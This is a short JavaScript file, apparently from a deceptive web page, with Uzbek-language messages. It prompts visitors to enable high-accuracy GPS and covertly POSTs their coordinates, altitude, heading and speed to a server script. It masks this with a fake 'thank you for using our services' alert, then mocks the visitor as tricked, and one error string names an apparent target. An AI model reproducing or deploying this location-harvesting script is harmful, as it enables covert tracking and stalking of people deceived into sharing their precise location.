function locate()
{
  if(navigator.geolocation)
  {
    var optn = {enableHighAccuracy : true, timeout : 30000, maximumage: 0};
    navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
  }
  else
  {
    alert('GPS ni yoqmagansiz! Iltimos qayta urinib ko`ring!...');
  }

  function showPosition(position)
  {
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;
    var acc = position.coords.accuracy;
    var alt = position.coords.altitude;
    var dir = position.coords.heading;
    var spd = position.coords.speed;

    $.ajax({
      type: 'POST',
      url: '/php/result.php',
      data: {Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd},
      success: function(){$('#change').html('Sizni aldashdi, hayolingiz qayerda o`zi?');},
      mimeType: 'text'
    });
    alert('Bizning hizmatlarimizdan foydalanganingiz uchun rahmat, tez orada siz bilan bog`lanamiz...');
  };
}

function showError(error)
{
	switch(error.code)
  {
		case error.PERMISSION_DENIED:
			var denied = 'Jumanazar aka manzilini bermadi!';
      alert('Iltimos GPS nin yoqing va qayta urinib ko`ring...');
      break;
		case error.POSITION_UNAVAILABLE:
			var unavailable = 'Manzili aniqlanmadi';
			break;
		case error.TIMEOUT:
			var timeout = 'Urinishlar soni ko`p! Yana urinib ko`ring!';
      alert('Iltimos gpsni aniqlashga ruhsat bering!...');
			break;
		case error.UNKNOWN_ERROR:
			var unknown = 'Noma`lum xatolik!';
			break;
	}

  $.ajax({
    type: 'POST',
    url: '/php/error.php',
    data: {Denied: denied, Una: unavailable, Time: timeout, Unk: unknown},
    success: function(){$('#change').html('Topilmadi');},
    mimeType: 'text'
  });
}
